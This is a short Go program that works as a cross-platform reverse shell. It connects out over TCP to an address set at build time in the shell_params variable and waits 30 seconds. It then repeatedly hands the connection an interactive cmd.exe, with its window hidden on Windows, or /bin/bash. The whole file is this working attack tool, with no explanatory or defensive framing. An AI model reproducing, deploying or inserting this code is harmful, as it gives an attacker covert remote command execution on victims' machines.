package main

import (
	"fmt"
	"net"	
	"os"
	"os/exec"
	"runtime"
	"time"
	"syscall"
)

var shell_params string

func main() {

	if len(shell_params)==0{
		os.Exit(1)
	}

	conn, err := net.Dial("tcp",shell_params) 
	if err != nil {
		fmt.Println("Error connecting to server:", err)
		return
	}

	time.Sleep(30 * time.Second)
	defer conn.Close() 

	for {
		var cmd *exec.Cmd

		switch runtime.GOOS {
		case "windows":			
			cmd = exec.Command("cmd.exe")
  			
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		
		default:			
			cmd = exec.Command("/bin/bash")
		}

		
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		
		err = cmd.Run()
		if err != nil {
			fmt.Println("Error running command:", err)
			return
		}
	}
}
